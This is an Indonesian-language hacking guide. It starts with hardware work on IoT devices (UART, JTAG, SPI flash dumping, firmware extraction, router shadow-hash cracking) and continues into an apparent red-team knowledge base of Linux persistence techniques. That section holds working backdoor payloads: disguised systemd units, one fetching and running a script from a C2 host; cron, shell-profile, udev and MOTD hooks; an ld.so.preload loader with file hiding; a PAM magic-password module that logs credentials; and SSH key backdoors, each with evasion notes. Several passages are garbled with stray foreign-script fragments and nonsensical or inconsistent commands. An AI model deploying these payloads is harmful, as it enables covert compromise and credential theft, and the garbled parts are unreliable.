## 1. Identifikasi UART

### 1.1 Mencari pinout
Kandidat: 4 pad sejajar (TX/RX/GND/VCC), silkscreen `J1`, `CON`, `DEBUG`, via berukuran lebih besar. Cari GND dulu (continuity ke shield/ground plane), lalu ukur tiap pin:

| Gejala pin | Interpretasi |
|---|---|
| Konstan 3.3V / 5V | VCC (runtime) |
| ~0V konstan | GND (verifikasi beep ke plane) |
| ~3.3V, sesekali drop saat boot | **TX target → RX analyzer** |

### 1.2 Sniff dengan logic analyzer
Sampling PulseView ≥ 1 MHz per channel, ~16 MHz keseluruhan. Rekam **saat power-on** — boot banner keluar dalam 2–5 detik pertama.

**Yang dikirim:** tidak ada (passive).
**Yang muncul:** burst aktivitas sekitar `0x0D 0x0A` — teks banner.

Tambah decoder UART di PulseView, tebak baud, atur RX channel. Salah baud = karakter acak; pulsanya seragam → hitung baud manual:

- Lebar pulsa bit terpendek = 1/baud. Contoh q= 8.68 µs → 115200.

Baud umum:

| Kelas perangkat | Baud |
|---|---|
| Router MT76xx/QCA | 115200 |
| Modem STM32/industrial | 9600/19200 |
| ESP32 (boot ROM) | 115200 |
| Somfy/HiSoC/Cortex-A STB | 1500000 (jangan подключ分析仪 жалгат) 115200/1500000 |
| ONT GPON ZTE/Huawei | 115200 |

Perangkat di shell kubectl idle dasar-band, jangan idle logic test.

### 1.3 Interaksi serial

```bash
sudo picocom -b 115200 /dev/ttyUSB0
# keluar: Ctrl-A Ctrl-X
```

**Yang dikirim:** enter berkali saat boot; atau Ctrl-C dalam window `1-2s` saat `Hit any key to stop autoboot`.
**Yang muncul:** prompt U-Boot (` великийA U-Boot>`, `AR7161 #`) atau Linux shell.

Payload U-Boot standar:

```
printenv                        # dump seluruh env, cari baudrate/serverip
bootdelay                       # kenaikan autoboot window
setenv bootargs console=ttyS0,115200 init=/bin/sh root=/dev/mtdblockX   # rootfs tanpa init
boot
# atau oracle dump via serial memang лектор mungkin tak perlu network:
md.b 0x80002000 0x1000          # dump via command-line ke terminal H/F
```

Kenapa berhasil: U-Boot/Bootloader sering `CONFIG_DISABLE_CONSOLE=n` dan `bootdelay>0`.
Kenapa gagal: kernel `console=` salah tty (output mati setelah kernel start — output bootloader tetap terlihat), logic level 1.8V vs USB-UART 3.3V, atau `bootdelay=0` genap (patch vendor umum di ONT ISP).

---

## 2. JTAG (OpenOCD)

### 2.1 Identifikasi
Header 10–20 pin, label `TCK/TMS/TDI/TDO/TRST`, atau pad test-point 5+ berkelompok. Samakan arah GND dan satu pin tahan tegangan konstan (idle-high TMS, clock-low waktu istirahat). Kalau pin tak berlabel: JTAGulator brute-force semua kombinasi 4-pin dalam <1 menit.

OpenOCD target harus cocok dengan SoC:

| SoC | Config OpenOCD (v0.12.0+) |
|---|---|
| MT7621 (Mir4/AirMax/Ubiquiti era 2018+) | `target/mt7621.cfg` via custom cfg (OpenOCD 0.12 + patch) |
| Atheros AR9343 (router Qualcomm Atheros) | `target/atheros_ar9340.cfg` (IR custom ada di README OpenOCD issue #411) |
| STM32/hiFiBerry/kamera CP2102 | `target/stm32f1x.cfg` |

```bash
# contoh MT7621:
cat > stm32_install.cfg <<EOF
adapter driver ftdi
ftdi device_desc "FT232H"
ftdi vid_pid 0x0403 0x6014
ftdi layout_init 0x0088 0x008b
transport select jtag
adapter speed 1000
set _CHIPNAME mt7621
jtag newtap \$_CHIPNAME cpu -irlen 5 -expected-id 0x03637001
set _TARGETNAME \$_CHIPNAME.cpu
target create \$_TARGETNAME mips_mips64 -chain-position \$_CHIPNAME.cpu
EOF
sudo openocd -f mt7621.cfg
# connects to port 3333 telnet via:
telnet localhost 4444
```

Perintah telnet OpenOCD untuk mendapatkan akses:

```
> reset halt
> mww 0xB800000 ... (konfigur register per kartu)
> mdw 0x80010000 32        # baca RAM
> flash banks              # hmm — target MIPS perlu proxy
> dump_image spi_via_cpu.bin 0x9D000000 0x1000000   # address-mapped flash di KSEG1
```

Kenapa berhasil: JTAG scan-chain tidak diburn SRST pin kegagkan pada router bootloader mode (harus jadi kasus `openocd` with `reset_config none` jika tidak ada `trst`/`srst` — halus dengan `reset` peragas via `halts` setelah kernel actives).
Kenapa gagal: BLock `reset halt` saat SoC shooting aktif Anda perlu reset papan (power ciclo/manual); `expected-id` tidak cocok (patch IR length per datasheet); OpenOCD 0.12 tanpa patch tidak support ar9343 eJTAG > 2.0 (gunakan `ejtag_srst` patch).

OpenOCD dipakai untuk VM introspection/`reset halt` — untuk dev board ESP32/RT5350/sering ada `flashrom` route lebih reliable (bab 3).

## 3. SPI Flash Dump

### 3.1 Identifikasi chip

Baca topmarking chip SOP8 ( NOR umum 1–32 MB):

| Marking | Chip | Size | Voltage |
|---|---|---|---|
| W25Q128JV | Winbond | 16 MB | 3.3V |
| W25Q64FV | Winbond | 8 MB | 3.3V |
| MX25L1606E | Macronix | 2 MB | 3.3V |
| GD25Q128 | GigaDevice | 16 MB | 3.3V |
| EN25QH64A | EON | 8 MB | 3.3V |
| MT25QL128 (NAND, bukan NOR) | Micron | — | pakai flashrom bb_spi |

Pinout SOP8 NOR (view dari atas, notch pin 1):

```
      ┌───∪───┐
 /CS ─┤1    8├─ VCC
  DO ─┤2    7├─ /HOLD (bisa jadiRESET)
 /WP ─┤3    6├─ CLK
 GND ─┤4    5├─ DI
      └──────┘
```

### 3.2 Dump dengan CH341A + flashrom

Dengan klip SOIC8 ke chip (perangkat mati / baterai dilepas), atau lepas chip:

```bash
sudo flashrom -p ch341a_spi:r     # ops: read; identify
sudo flashrom -p ch341a_spi -r dump1.bin
sudo flashrom -p ch341a_spi -r dump2.bin
cmp dump1.bin dump2.bin   # harus identik; kalau beda → tambat/noise → cek kabel
```

**Yang dikirim:** flashrom mengirim `0x9F` (JEDEC ID), lalu read command `0x03` per byte page.
**Yang muncul:** `Found Winbond flash chip "

## [lanjutan]

## 3.6 Sub-topik Lanjutan Hardware Hacking

### 3.6.1 Identifikasi UART pada Perangkat Tanpa Header Jelas

Banyak perangkat produksi massal tidak menyediakan header UART eksplisit. Pendekatan lanjutan:

**Metode visual dan kontinuitas**

1. Cari 4 pad/berlubang (via) sejajar dekat TX chip (MTK, Realtek, Qualcomm).
2. Multimeter mode kontinuitas: pin yang tersambung ke GND, pin dengan ~3.3V stabil (VCC), dua pin tersisa (TX/RX).
3. Ukur tegangan idle: TX pegang logika tinggi (~3.3V), RX biasanya rendah/mengambang.

**Tabel kontinuitas tipikal**

| Pin | Ciri |
|---|---|
| GND | Beep ke casing/pad ground besar |
| VCC | 3.3V tetap saat boot |
| TX | 3.3V idle, turun saat boot (burst data) |
| RX | 0V atau mengambang |

**Menangkap baud tanpa tebak-tebakan**

Logic analyzer + PulseView/DSView, dekode protokol UART otomatis:

```
# PulseView: klik decoder UART, run pada saat boot device
# Alternatif: retdec UART quess / brute-force dengan script python serial
```

Baud rate tidak baku? Beberapa vendor:

| Vendor | Baud umum |
|---|---|
| Ubiquiti | 115200 |
| Xiaomi | 115200 |
| TP-Link | 115200, sesekali 57600 |
| Huawei | 115200 |
| IoT Zigbee (TI CC2530) | 115200 tapi 8N1 dengan header biner |
| Modem GSM Quectel | 115200 (AT di console) |

Jebakan: beberapa chip menggunakan **921600**, 250000 (debug ESP8266/ESP32 ROM), 74880 (boot ROM ESP8266). Divider clock tidak selalu menghasilkan baud standar.

### 3.6.2 JTAG: Pinout Non-Standar dan Proteksi

- **OpenOCD** config tipikal, contoh chip populer:

```
# /usr/share/openocd/scripts/target/stm32f1x.cfg
openocd -f interface/stlink.cfg -f target/stm32f1x.cfg
openocd -f interface/jlink.cfg -c "transport select jtag" -f target/atheros_ar9331.cfg
```

- **Chip kustom (Broadcom/Qualcomm Router)** sering menyembunyikan JTAG; TCK/TMS/TDO/TDI terdeteksi via JTAGulator atau JTAGenum (Arduino):

```
# JTAGulator
python3 jtagulator.py  # brute-force pin mapping per pin
```

- **Edge case terbaru**: banyak SoC IoT beralih ke **SWD** (2 pin) — gunakan `interface/cmsis-dap.cfg`; JTAG out-of-the-box tidak bekerja.

Jebakan operasional JTAG:

- Register IR lebih dari 8 bit (misal 12 bit Xilinx) — gagal deteksi bila `IR length` salah di config OpenOCD.
- Ada fuse **JTAG disable irreversible** (efuse pada Qualcomm/MediaTek) — cek datasheet sebelum probing agresif.
- RST/timing: jalankan `reset halt` sebelum read flash agar CPU tidak menimpa memori.

### 3.6.3 SPI Flash Dump — Mode Lanjutan

**CH341A edge case**

- Tegangan default 3.3V — cek modul "CH341A 1.8V fix" untuk flash NAND P/popper modern (MacBook, beberapa Winbond 1.8V series W25QxxxxFW).
- Flash 1.8V/0.9V (misal Winbond W25M) butuh adaptor level shifter, bukan sambung langsung.

**Dua chip / dual-die (stacked)**

- Chip dengan stack die (W25M512JV) — gunakan `flashrom --die 0` / `--die 1`.
- Perintah dump:

```
flashrom -p ch341a_spi -r backup1.bin --die 0
flashrom --chip W25M512JV -r dump.bin --die 1
```

**Konsistensi dump**

- Selalu dump 2x dan `diff`; jika berbeda kemungkinan chip terlalu lambat atau kabel noise:
  - Kurangi kecepatan SPI (`spispeed` di rasPi:

```
flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=2000 -r dump.bin
```

**Flash belum dikenali**

- Coba `flashrom --flash-name` atau `-c <nama manual>` bila ID JEDEC beda bit.
- Untuk NOR klone China (SFDP tidak valid), pakai `-c` dengan profil chip terdekat — risiko erasing salah.

**Dump **in-circuit** (tanpa solder lepas)**

- Pastikan MCU tidak menggiring bus SPI; opsi:
  - Tahan MCU di reset (tahan NRST low).
  - Putus jalur CS (IR dropdown, potong jumper).
  - Gunakan "Spike` clip kecil" SOIC8/SOP16/WSON8.

**Edge case**: WSON8 dan VQFP memory pakai probe kit `Pomona 5250` ke bawah; tidak semua clip menepu pada package tanpa lead.

**Polaris `espressif` dan `xtensa` build** (QEMU fork ESP):

```
make chip=esp8266 || qemu-system-xtensa -M esp8266 -kernel dump.bin
```

### 3.6.4 Firmware Extraction — Binwalk & Unblob Deep Dive

**Binwalk v3 (jamin)**

```
binwalk -Me firmware.bin          # extraction rekursif
binwalk -A firmware.bin          # signature scan
binwalk --entropy firmware.bin   # deteksi terenkripsi/compressed
```

- **Konten CramFS/SquashFS**: binwalk ekstrak akan mem-mount filesystem - sekitar daftar kernel:
  - `squashfs-root/` | binwalk akan list `LZMA`, `gzip`, `SQUASHFS`.
- Kalau gagal, gunakan `sasquatch` (untuk versi squashfs non-standar — DD-WRT, vendor custom):
  - `unsquashfs -d outdir squashfs-root/squashfs.bin`

**Unblob** (pengganti modern binwalk untuk firmware besar)

```
unblob extract firmware.bin
unblob -e /tmp/out -v firmware.bin
```

- Kelebihan: deteksi entropy + exFAT, UBI, CPIO terbaru, multi-thread parallel.
- UBI/UBIFS: `ubireader_extract_files` (dari package `ubi_reader`).
- Filesystem singularity modern: JFFS2 perlu `jefferson` (Python):

```
jefferson jffs2.img -d output/
```

**Firmware Terenkripsi (uang banyak vendor)**

- `binwalk --entropy` menunjukkan flat ~1.0 entropy sejak awal file → kemungkinan header terenkripsi.
- Cari string "AES" atau key di firmware unit sejenis versi lebih lama; beberapa key telah di-publikasikan di repositori `firmware-mod-kit`, `fwtool`, dan `IoTFirmwareKeyDumps`.
- Alternatif hardware: dump flash → jalankan binary image **via UART uboot** → dump RAM untuk decrypt key di runtime.

**UBI dump dari flash - mounting loop:**

```
ubinize /dev/mtd0 -o ubi.img  # tidak: use nanddump untuk full
nanddump -f nand.bin /dev/mtd0
ubireader_extract_files nand.bin
```

### 3.6.5 Emulasi — FirmAE, Firmadyo, QEMU

**Matriks emulasi**

| Tool | Kecepatan penyiapan | Dukungan router | Fitur khusus |
|---|---|---|---|
| FirmAE | Oke, otomatis 30+ brand | Bagus | ` FirmAE/init.py` assess + run |
| Firmadyo (asal) | Lambat, manual | Sedang | Penuh network sim |
| QEMU user-mode | Cepat per-binary | - | Emulasi binary tunggal `qemu-arm-static ./busybox` |
| QEMU full-system | Manual | - | Debug `-d in_asm -kernel zimage` |

**Perintah tipikal FirmAE**

```
./init.sh
./scratch 2 <vendor> <firmware.bin>   # mode assess
./scratch 1 <vendor> <firmware.bin>   # mode run full
```

Jebakan: **FirmAE Mac M1** gagal compile karena klean butuh `afl` flag波澜; gunakan Intel x86 docker image `firmae:latest`.

**QEMU per-arsitektur**

```
qemu-system-arm -M vexpress-a9 -kernel zImage -dtb vexpress-v2p-ca9.dtb \
     -drive file=rootfs.ext2,if=sd -append "root=/dev/mmcblk0"
```

**Debug edge**:

- QEMU gagal boot karena `drivers/spi` atau `PHY` chip tidak ada — kernel panic `VFS unable to mount root` → cek `root=`, `console=ttyS0`.
- MIPS-BE vs MIPS-LE: salah endianness menyebabkan `Bad Ramirez` — binwalk `E`ELF header check terlebih dahulu.
- Network QEMU: gunakan perintah `-netdev user,id=net0,hostfwd=tcp::80-:80` dan cek via `nmap` internal `10.0.2.2`.

**Debug MIPS kernel via qemu** (untuk zero-day kernel IoT):

```
qemu-system-mips -M malta -kernel vmlinux -hda rootfs.img \
   -append "root=/dev/sda1 console=ttyS0" -nographic -netdev user,id=n1
```

**Emulasi single binary (Non-root perkakas)**

- `firmadyne` penuh vs `qemu-arm-static` untuk fuzzing klien tunggal — ekstrak `usr/bin/httpd`, helper `LD_LIBRARY_PATH`:

```
sudo chroot . /usr/bin/qemu-mips-static ./usr/sbin/httpd
```

Jebakan umum: `/etc/init.d/rcS` script memanggil device-specific daemon, tidak berjalan di QEMU (tanpa `/dev/gpio`) — stub manual atau patch strace.

### 3.6.6 Perangkat Fisik dan Alat Pengukuran

**Tabel alat**

| Kebutuhan | Alat | Catatan |
|---|---|---|
| Dapat SPI 8-SOIC | CH341A + Pomona 5250 | ~5 USD, populer |
| Logic analyzer | Saleae Logic 8, DSLogic Plus | 16 channel cukup untuk SPI+UART |
| JTAG/SWD | J-Link, ST-Link v2, FTDI (OpenOCD) | ST-Link murah untuk ARM Cortex |
| Oscilloscope | Rigol DS1054Z | analisis rise-time SPI clock |
| UART USB adapter | FT232H / CP2102 | 3.3V/1.8V switchable |
| Hot air rework | Quick 861DW | untuk WSON/QFN flash chip |

**Tabel kerentanan FPGA** – ZYNQ: `xc3sprog` (Xilinx) via JTAG untuk dump bitstream:

```
xc3sprog -c jtaghs1 bitstream.bit
```

### 3.6.7 Proses Analisis Perangkat Nyata

**Contoh walkthrough TP-Link Archer C7:**

1. Buka casing, lihat UART melalui pad J3 (tanpa header) - solder.
2. `screen /dev/ttyUSB0 115200` - dapat shell busybox level user.
3. UART hanya user shell; untuk root, dump SPI dengan CH341A:
   - `flashrom -p ch341a_spi -r backup.bin --chip MX25L6406E`
4. `binwalk -Me backup.bin`, buka `/etc/shadow` → crack hash:
   - `hashcat -m 500 hash.txt wordlist`
5. `FirmAE scratch 2 tplink archer-c7-firmware.bin` → nmap full router:
   - hasil: web admin siap difuzz dengan `ffuf`.

**Contoh IoT Zigbee (TI CC2538):**

- Debug via JTAG `openocd -c "adapter driver linux_spi"` + `cc2538.cfg`.

### 3.6.8 Jebakan Operasional & Kesalahan Umum

- **Tegangan flash** — jangan asumsi 3.3V; cek datasheet sebelum dump.
- **Half pint (trace tebal)** mengakibatkan read gagal intermiten, SDM wave: kurangi spispeed.
- CH341A **menyediakan 5V** di versi lama — bisa merusak flash 3.3V; gunakan modul regulator atau versi baru.
- FlashROM dan **SPI bus in-circuit dengan pull-up lemah**: pertimbangkan `SPI` pin `WP#/HOLD#` di-tambah `flyback` diode dalam beberapa board modem.
- UART **serial console dua kabel** (tanpa GND bersama) menyebabkan garbage→ pastikan ground lang antara USB adapter dan perangkat.
- `binwalk -Me` pada firmware terenkripsi bisa membuat ribuan file sampah — **selalu konten entropy dulu**.
- OpenOCD gagal "target not halted" pada chip yang menggabungkan **two die** (misal nRF52840) — gunakan `nrf51.cpu` / `nrf52.cpu cmake single` tap config.
- Saat re-flashing flash hasil temuan vendor, ** tandai biner lama** sebagai backup karena sebagian vendor menyimpan data kalibrasi (MAC, calibration) di blok data bukan firmware main.

### 3.6.9 Terminologi & Panduan Lab Setup

- Keran alat: multiplexer UART - kalau menguji 5+ perangkat: [pipert 3 port ].(itorial)
- Isolasi USB (isolator) untuk perangkat dengan ground loop (PoE router, dimmer high-side).
- Lab notebook — catat tiap dump MD5:
  `md5sum backup.bin` termasuk ringkas alat dan `flashrom version` — auditabilitas dan perbandingan sesudahnya.

## Daftar perintah cheat sheet

```
# UART
sudo screen /dev/ttyUSB0 115200 8N1

# SPI
flashrom --flash-name
flashrom -p ch341a_spi -r dump.bin
flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -r d.bin
flashrom -p ch341a_spi --die 0 -r d0.bin

# JTAG
openocd -f interface/stlink.cfg -f target/stm32f4x.cfg
telnet localhost 4444

# Ekstraksi
binwalk -Me fw.bin
unblob extract fw.bin
sasquatch sqfs.bin
jefferson jffs2.bin

# Emulasi
qemu-arm-static ./binary
./scratch 1 tplink fw.bin   # FirmAE
```

Bab ini menutup aspek hardware hacking lanjutan — identifikasi manual UART, proteksi JTAG/efuse, dump SPI non-standar, firmware terkompresi/terenkripsi, dan strategi emulasi — sebagai fondasi audit keamanan perangkat IoT tertanam.

## persistence-linux

# persistence-linux — linux

# Linux Persistence — Reference Guide (Red Team KB)

## 1. systemd Unit (Service & Timer)

### Payload: user-level service (no root, persists across reboot for logged-in user)
```bash
mkdir -p ~/.config/systemd/user/default.target.wants/
cat > ~/.config/systemd/user/rt.service <<'EOF'
[Unit]
Description=GNOME Accessibility Services

[Service]
Type=simple
ExecStart=/usr/local/bin/.hlp
Restart=on-failure
RestartSec=30

[Install]
WantedBy=default.target
EOF
systemctl --user daemon-reload
systemctl --user enable --now rt.service
```

**Apa yang muncul:** `systemctl --user list-units` menampakkan unit "GNOME Accessibility Services". Proses child muncul di `ps aux` dengan nama binary.

### Payload: system-level service (root)
```bash
cat > /etc/systemd/system/system-updates.service <<'EOF'
[Unit]
Description=System Update Helper
After=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/sh -c 'curl -s http://c2.ev:8443/x.sh | bash'
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
systemctl enable system-updates.service
```

### Payload: timer sebagai trigger berulang (lebih "legit" daripada cron)
```bash
cat > /etc/systemd/system/maintenance.timer <<'EOF'
[Unit]
Description=Periodic maintenance

[Timer]
OnBootSec=10min
OnUnitActiveSec=30min
RandomizedDelaySec=120

[Install]
WantedBy=timers.target
EOF
systemctl daemon-reload && systemctl enable --now maintenance.timer
```

**Kenapa berhasil:** `timers.target` jarang di-audit; `systemctl list-timers` memuat banyak timer bawaan distro (manjaro, unattended-upgrades) — satu timer tambahan cukup samar.

| Cek    | Perintah                                      |
|--------|-----------------------------------------------|
| Unit   | `systemctl list-unit-files --state=enabled`   |
| Timer  | `systemctl list-timers --all`                 |
| Escalate ke root | `systemctl show -p User,ExecStart <unit>` |

**Stealth notes:**
- Nama/Deskripsi menirup systemd bawaan: `systemd-udevd-check`, `dbus-activation`, `accounts-daemon-resp`.
- `OnCalendar=*-*-* 03:00` + `RandomizedDelaySec` flatten pola network.
- systemd ≥ v246: cek `systemctl --user` juga untuk user yang TIDAK login — jalankan `loginctl enable-linger <user>` agar user unit jalan tanpa login.
- Dump semua unit path ternoda: `find /etc/systemd /usr/lib/systemd -newer /etc/passwd`.

---

## 2. cron & at

### Cron (system)
```bash
cat > /etc/cron.d/backup-check <<'EOF'
SHELL=/bin/sh
*/45 * * * * root /usr/local/bin/.sysbak 2>/dev/null
```
```bash
# atau klasik
(crontab -l 2>/dev/null; echo "*/45 * * * * /home/u/.hlp") | crontab -
```

### Cron via @reboot (survive reboot)
```bash
@reboot root /usr/local/sbin/krn_check nohup &
```

### at (one-shot, analis sering lupa cek)
```bash
echo 'nohup /tmp/.x >/dev/null 2>&1' | at now + 15 minutes
```
**Apa yang muncul:** job masuk `/var/spool/cron/atjobs/` (Debian) atau `/var/spool/at/` (RHEL). `atq` dari user sesuai.

**Kenapa berhasil/gagal:**
- Berhasil: `cron.d` file tidak muncul di `crontab -l` (beda file location) — analis yang cuma `crontab -l -u root` kena gap.
- Gagal: `cron.d` file **wajib** mode 0644, owner root, tanpa `~` atau `%` di command. Cron diam-diam menolak file 0755/0664. `at` gagal jika `atd` tidak jalan (umum di container/minimal image).

**Stealth notes:**
- Interval ganjil (`*/47`, `*/53`) — tidak match pattern hunternya `*/1|*/5|0 * * *`.
- Payload di command line terlihat via `/proc/*/cmdline`; wrapper `@reboot` + binary file menghindari ini.
- /etc/cron.hourly|daily + wrapper di desktop: jangan; pola mtime-nya (semua file daily dieksekusi serentak ~06:25) membuat beacon timestamp korelasinya mencolok.

---

## 3. .bashrc / .profile / .bash_profile

### Payload: alias-less exec
```bash
# tersisip di tengah .bashrc setelah fungsi normal
(cd /tmp && ./.p &>/dev/null &)
```
Atau hidden process flag:
```bash
[ -z "$SEC" ] && export SEC=1 && (nohup /dev/shm/.s &>/dev/null &)
```

**Kenapa berhasil:** guard variable `SEC` mencegah spawn ganda saat nested-TTY (`su -`, `tmux`). `.bashrc` dieksekusi setiap interactive non-login shell; `.bash_profile` setiap login shell. Sisipkan di **kedua-duanya** plus `/etc/profile.d/x.sh` untuk cakupan system-wide.

| File               | Trigger                          |
|--------------------|----------------------------------|
| `~/.bashrc`        | setiap shell interaktif         |
| `~/.bash_profile`  | ssh/su login shell               |
| `~/.ssh/rc`        | sebelum shell mulai (via sshd)   |
| `/etc/profile.d/`  | semua user login (root)         |
| `~/.config/autostart/*.desktop` | XDG/GNOME/KDE login     |

**Stealth notes:**
- Jangan: `nc -e` inline atau komentar mencolok. Random hex var name: `_$(){ ... }`.
- Fail di Ubuntu 22.04+: shell interaktif via `#!/bin/bash` di Docker/ssh -c tidak baca `.bashrc` — karena non-interactive & non-tty. Use case analogue.
- Fail: `zsh` default (Kali, macOS lama) — pakai `.zshrc`.
- `/etc/bash.bashrc` (Debian) & `/etc/bash.bashrc` (openSUSE_Tumbleweed) adalah pola alternatif system-wide.

---

## 4. LD_PRELOAD & /etc/ld.so.preload

### Payload root: system-wide preload
```bash
# /etc/ld.so.preload
/usr/local/lib/lnx.so

# lnx.so = shared object, constructor dieksekusi di SETIAP dynamic binary
__attribute__((constructor)) void pwn(void) {
    if (getenv("PCHK")) return;
    setenv("PCHK","1",1);
    if (fork()==0) { setsid(); execve("/tmp/.b",0,0); }
}
```

### Per-user: tambah ke .bashrc
```bash
export LD_PRELOAD=/home/u/.c/lib.so
```

**Kenapa berhasil:** `/etc/ld.so.preload` dibaca loader glibc untuk **semua** dynamic ELF yang dijalankan termasuk `sshd`, `crond`, `ping`. Constructor berjalan sebelum `main()` target.

**Enhancement: interposisi untuk cmdline stealth**
```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
int reconcile = 0;
int access(const char *p, int m) {
    static int (*r)(const char*,int);
    if (!r) r = dlsym(RTLD_NEXT, "access");
    if (strstr(p,".b") || strstr(p,"ld.so.preload")) { errno=ENOENT; return -1; }
    return r(p,m);
}
```
Hook `access`/`stat64`/`fopen` untuk hide file payload sendiri dari audit yang jalan via ld preload chain prefix sama (hostname methane).

**Stealth & failure notes:**
- `ldd /bin/ls` tidak menunjukkan preload file **tetapi** `/proc/self/maps` per proses jelas tunjukkan path `.so` — hunters: `grep -r "lnx.so" /proc/*/maps`.
- `LD_PRELOAD` env Di lifecycle: **ignore saat binary setuid-root** — shell escape/tapa fake root. Use `/etc/ld.so.preload` untuk itu.
- Perintah restore untuk pactify check: `ldconfig -N` tidak invalidate; resource pakai `/etc/ld.so.cache` resync — check `strace -f -e openat /bin/true` untuk see preload path read.
- **Fatal:** preload corrupt/pelisted di daftar tapi target statis (misal `busybox`) tidak memuat — jangan hanya casual test dengan `ls`.
- Glibc 2.35+ Ubuntu 22.04: `LD_SHOW_AUXV` canary debug — pastikan `.so` buat `SSP` dan link `libc 2.35` (compile di target distro!). `.so` glibc 2.36 (Ubuntu 23.04) tidak load di 2.34 target.

### Verifikasi on-host:
```bash
strings /etc/ld.so.preload; readelf -d /usr/local/lib/lnx.so | head -3
strace -f -e openat getenv /bin/true 2>&1 | grep -E "preload|lnx"
```

---

## 5. PAM Module

Persistensi ke kelas atas: modify/hijack `pam_auth` chain — tetap lxml:

```bash
# /etc/pam.d/sshd -- tambahkan sebelum pam_unix
auth  sufficient  pam_exec.so expose_authtok /usr/lib/rtkey
```
`pam_exec` menerima password Plaintext via **stdin** jika `expose_authtok` dipakai — payload menulis password /uci dan `exit 0` (sufficient → autentikasi) untuk magic password:
```c
#include <unistd.h>
int main(int c, char **v) {
    char buf[256] = {0};
    read(0, buf, 256);
    if (getenv("PAM_USER") && getenv("PAM_RHOST")) { /* log all creds */ }
    if (strncmp(buf, "kn0ck-knock", 11)==0) { return 0; }
    return 1; /* fallthrough ke pam_unix */
}
```

**Kenapa berhasil:** setiap login SSH semua credential ke auth handler. `sufficient` membiarkan flow normal berjalan jika tidak cocok.

**Stealth notes:**
- Jangan edit berkas asli `pam_unix.so` — IntegrityOS hunt finger print-nya. Append saja di `/etc/pam.d/ssh`, `sudo`, `su`, kombinasi bagus: `sufficient` di atas.
- Dicek console: `pamtester sshd user authenticate` (makagithub).
- `include` chain confung: di Ubuntu `/etc/pam.d/common-auth` — satu file, eff semua entrypoint (`sudo | sshd | login`) → tapi lebih kentara.

---

## 6. udev Rule

Trigger on device event — originality tinggi, low-footprint.

```bash
# /etc/udev/rules.d/70-brightness.rules
ACTION=="add", SUBSYSTEM=="block", RUN+="/usr/lib/basic/loader.sh"
```
Re-apply: `udevadm control --reload-rules`
Trigger manual test: `udevadm trigger -c add -s block`

**Cara kerja:** event 'add' pada block subsystem (misal pending drive). `udevadm` membuat subprocess di mount namespace.

**Stealth notes:**
- Jangan `RUN+=/bin/bash -c ...` panjang — pointer file.
- `RUN` — bersifat **transient**: process dibunuh setelah event. Berlaku juga untuk rule with `RUN` initiate on boot — invoke `systemd-run --unit=rt ./.h` jika tidak mati setelah short time.
- Kalau tujuan tetap hidup: `RUN+="/usr/bin/systemctl start foo.service"` — effectively 2-stage persistence di chain (udev trigger ke systemd unit tersembunyi).
- High-noise trigger: `ACTION=="add", SUBSYSTEM=="net"`.
- Chek: `udevadm info -e` akan list expired.
- Berlaku hanya at boot — jika tidak ada inculcation rule reload, current session device nie aboc currigen.

**Wild fail:** / `NAME` mismatch environment/reference. Test dulu pada `kernel command line` app run inside `sudo udevadm test $(udevadm info -q path /dev/sda) action add` — harus verify script bound executed in output terminal.

---

## 7. SSH authorized_keys & ForceCommand

Duplikat shell init jago:
```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
cat >> ~/.ssh/authorized_keys <<'EOF'
ssh-rsa AAAA...== backup@host
EOF
chmod 600 ~/.ssh/authorized_keys
```

**Authorized key mandatory silent feature:**
```
command="/bin/bash -c '/usr/sbin/x -fAns; /bin/sh -i'" ssh-rsa AAAA... backup@host
```
Atau silent single-purpose keys:
```
# option penuh:
no-port-forwarding,no-agent-forwarding,no-X11-forwarding,permitopen="10.0.0.5:445" ssh-rsa ...
```

**ForceCommand server-side (lebih eksplisit)** — `/etc/ssh/sshd_config` atau `Match User`:
```
Match User svc_backup
    ForceCommand /usr/local/bin/x
    PermitTTY no
```

**Kenapa berhasil:** `authorized_keys` dilakukan oleh default `sshd` — tanpa integrasi. ForceCommand override even kepada pty interactive bagus hidden di `wtmp` dengan `PermitTTY no` ⇒ bukan login shell tetapi command exec. `ssh -T user@host` tetap triggers.

**Stealth notes:**
- Option tunnel:
```
PermitOpen "127.0.0.1:4444",PermitListen "127.0.0.1:5555" no-pty,command="/bin/sleep 4294967" ssh-rsa ...
```
  Kombinasikan dengan SSH tunneling—`ssh-keygen -t ed25519 -f key -N ""` untuk sfumatura (renasearch noise).
- Cek jalanan: `grep -r PubkeyAcceptedAlgorithms /etc/ssh/sshd_config`; Percona: OpenSSH 9.8 deprecated RSA kecil /SSH algorithm default mismatch.
- `authorized_keys` fail pada `-636` selinux (redhat) jika restore context belum:
```bash
restorecon -v ~/.ssh/authorized_keys  # fix
getenforce                          # verify
```
- **Nested boomerang:** jejak di `/var/log/auth.log` mencat "Accepted publickey" tiap check-in — upsurv turnaround linear dengan misuse content.

**Exec proxy chain**

Kode `sshd_config.d/*` hal jauh lebih aman na post-release: - State check via `sshd -T` output for live config delta.
- `PubkeyAuthOptions=verify-required` (OpenSSH 8.9+) membatasi NoLogin physical bypass.

2fa hijack patern `port 2222` plus `/etc/ssh/sshd_config.d/50-key.conf`

**Dua cek banner-blindspot:**
- `sshd_config reload: `sudo systemctl reload sshd` — malah `sshd -t` validity check mandatory before send live
- `PubkeyAuthOptions verify-required` kills silent persist via key alone; `gssapi` prorata bypass more alive but noisy.

Combine `authorized_keys` + systemd unit = survival maximum: EnsureTrust:
- `sshd` respons restart ih diligence confides session cradle ssh quotas

---

## 8. MOTD

Keunikan: MOTD dievaluasi saat shell login — command runner path.

```bash
# /etc/update-motd.d/50-sys-hint  (Ubuntu: script motd executables)
#!/bin/sh
(nohup /usr/lib/.h >/dev/null 2>&1 &)
echo "System running normally"
```

**Kenapa:** At each SSH / interactive login engine runs all executable files under `/etc/update-motd.d/`. Fetch execute berulang.

**Stealth notes:**
- Output harus terlihat natural, otherwise it takes `LoginGraceTime` suspicion.
- `motd=disable` in `sshd_config` — target dimaksi disable, so payload never executes — istilah multi path caution.
- Teamd ragu: `PAM motd_dynamic.so` and scripts sorted numerical; use existing path name modification probable gold)**great**: modify `50-landscape-sysinfo` wrapper.
- On RHEL: `pam_motd.so` static `/etc/motd` (bukan script) — suka gagal jika kamu mengcopy pola Ubuntu tombol executable.

---

## 9. Kernel Module (rootkit level kernel)

